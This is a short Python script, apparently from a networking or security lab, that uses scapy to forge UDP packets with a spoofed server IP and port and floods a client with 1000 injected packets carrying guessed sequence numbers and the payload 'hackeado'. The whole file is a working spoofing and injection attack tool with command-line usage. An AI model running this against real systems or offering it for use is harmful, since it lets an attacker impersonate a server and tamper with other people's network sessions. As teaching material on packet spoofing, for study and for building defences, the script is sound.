#!/usr/bin/python3
import sys
from scapy.all import UDP, IP, Raw, send, conf
import random

print(conf.route)

def inject_pirate_packets(server_ip, server_port, client_ip, client_port):
    print(f"Pirate is attacking! Sending packets to {client_ip}:{client_port} pretending to be {server_ip}:{server_port}")

    # range of seq nums
    for seq_num in range(0, 1000):
        # hackeado fake payload
        fake_payload = seq_num.to_bytes(2, 'big') + f"hackeado".encode()

        # forged packet
        pirate_packet = IP(src=server_ip, dst=client_ip) / UDP(sport=server_port, dport=client_port) / Raw(load=fake_payload)

        # sending forged packet
        print(f"Injecting fake packet with sequence number {seq_num}")
        send(pirate_packet, verbose=0)

    print("Attack completed!")


if len(sys.argv) != 5:
    print("Usage: ./pirate.py <server_host> <server_port> <client_ip> <client_port>")
    sys.exit(1)

server_ip = sys.argv[1]
server_port = int(sys.argv[2])
client_ip = sys.argv[3]
client_port = int(sys.argv[4])

inject_pirate_packets(server_ip, server_port, client_ip, client_port)